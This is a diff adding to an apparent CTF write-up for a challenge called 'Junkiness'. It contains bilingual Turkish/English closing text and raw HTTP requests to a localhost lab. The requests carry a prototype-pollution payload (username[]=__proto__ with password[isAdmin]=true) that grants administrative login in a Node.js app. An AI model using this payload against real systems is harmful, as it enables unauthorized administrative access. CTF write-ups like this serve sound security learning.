@@ -33,3 +33,22 @@ The "Junkiness" challenge involved exploiting unsafe object merging in a Node.js
     Injecting the Payload: Send the intercepted request to the Repeater module. Modify the body to include the Prototype Pollution payload (e.g., using username[] for length bypass and __proto__ for property injection).
 
     Authentication Bypass: Once the server responds with a "Success" message, use the poisoned parameters to perform a login. Since the global object is now polluted, the application will grant administrative access upon login.
+
+
+POST /register HTTP/1.1
+Host: localhost:3000
+Content-Type: application/x-www-form-urlencoded
+
+username[]=__proto__&password[isAdmin]=true&password[password]=1
+
+POST /login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/x-www-form-urlencoded
+
+username=password&password=1
+
+🇹🇷 Türkçe:
+Eğer payload başarılı bir şekilde işlendiyse ve sisteme giriş yapabiliyorsanız, (exploit) sürecimiz tamamlanmış demektir. Bu aşamadan sonra tarayıcı üzerinden giriş paneline dönüp bilgilerinizle giriş yapabilir ve "Free Flag" butonuna tıklayarak bayrağı elde edebilirsiniz.
+
+🇺🇸 English:
+If the payload has been processed successfully and you are able to log in, the exploitation process is complete. At this stage, you can return to the login panel via your browser, sign in with your credentials, and capture the flag by clicking the "Free Flag" button.
